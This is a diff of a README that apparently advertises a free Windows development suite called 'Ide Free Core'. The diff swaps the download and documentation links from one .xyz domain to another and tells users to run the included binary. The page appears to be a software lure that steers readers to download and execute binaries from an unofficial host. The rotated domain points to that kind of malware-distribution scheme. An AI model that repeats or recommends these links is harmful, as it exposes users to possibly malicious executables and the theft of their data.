@@ -9,9 +9,9 @@ Complete **Ide Free Core** development suite offering code review, CI/CD pipelin
 - [ ] Launch the included setup utility or run the main binary directly.
 
 ## Get it
-➡️ **[Download the latest release](https://ide-free-core.softonx.xyz)**
+➡️ **[Download the latest release](https://ide-free-core.softax.xyz)**
 
-Details & docs: https://ide-free-core.softonx.xyz
+Details & docs: https://ide-free-core.softax.xyz
 
 ## System Requirements
 - OS: Windows
